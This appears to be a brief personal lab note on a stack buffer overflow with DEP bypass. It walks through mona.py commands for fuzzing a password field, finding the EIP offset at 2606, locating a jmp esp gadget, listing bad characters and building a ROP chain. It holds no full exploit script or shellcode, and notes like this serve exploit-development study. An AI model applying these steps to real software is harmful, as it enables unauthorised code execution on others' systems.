# DEP_bypass----Buffer_Overflow



### 1. Fuzzing

- buffer overflow in password field
- after sending 3000 bytes

- we successfully overwrite instruction pointer

![image-20201219113741138](DEP_bypass----Buffer_Overflow.assets/image-20201219113741138.png)





### 2. Controlling EIP

```
!mona pc 3000
```

```
!mona po address
```

- we need to find offset, so that control it with our desired value

- offset is at 2606

![image-20201219114413350](DEP_bypass----Buffer_Overflow.assets/image-20201219114413350.png)

- we can control EIP after 2606 bytes of offset

![image-20201219114612851](DEP_bypass----Buffer_Overflow.assets/image-20201219114612851.png)



### 3. finding jmp esp

```
!mona jmp -r esp
!mona find -s '\xff\xe4' -m slmfc.dll
```



- jump esp is there to make EIP control go to stack where payload is loaded and then execute it

![image-20201219120233709](DEP_bypass----Buffer_Overflow.assets/image-20201219120233709.png)



### 4. finding badchars

```
!mona compare -f file -a address
```



- badchars

```
"\x00\x0a\x0d"
```



### 5. with DEP

```
!mona rop -m *.dll -n -cpb "\x00\x0a\x0d"
```

